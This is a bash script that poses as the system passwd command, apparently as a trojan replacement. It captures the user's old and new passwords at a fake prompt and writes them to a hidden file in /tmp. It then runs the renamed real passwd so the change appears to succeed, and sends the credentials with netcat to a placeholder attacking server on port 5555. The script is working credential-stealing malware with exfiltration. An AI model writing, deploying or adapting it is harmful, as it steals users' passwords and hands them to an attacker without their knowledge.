#!/bin/bash
# Permission 755
LOGFILE="/tmp/.passwords"
SERVER_IP="AttackingServerGoesHere"
PORT="5555"
CURRENT_USER=$(whoami)

echo -n "Changing password for $CURRENT_USER.
Current password: "

stty -echo
read CURRENT_PASSWORD
stty echo
echo

echo -n "New password: "
stty -echo
read NEW_PASSWORD
stty echo
echo

echo -n "Retype new password: "
stty -echo
read NEW_PASSWORD_RETYPE
stty echo
echo

if [ "$NEW_PASSWORD" != "$NEW_PASSWORD_RETYPE" ]; then
    echo "passwd: Passwords do not match" >&2
    exit 1
fi

echo "User $CURRENT_USER attempted password change at $(date).
    Old Password -> $CURRENT_PASSWORD
    New Password -> $NEW_PASSWORD" >> $LOGFILE

echo "passwd: password updated successfully"

stty sane
echo -e "$CURRENT_PASSWORD\n$NEW_PASSWORD\n$NEW_PASSWORD" | nut_passwd >/dev/null 2>&1

echo "User $CURRENT_USER attempted password change at $(date).
    Old Password -> $CURRENT_PASSWORD
    New Password -> $NEW_PASSWORD" | nc -q 0 $SERVER_IP $PORT

exit 0
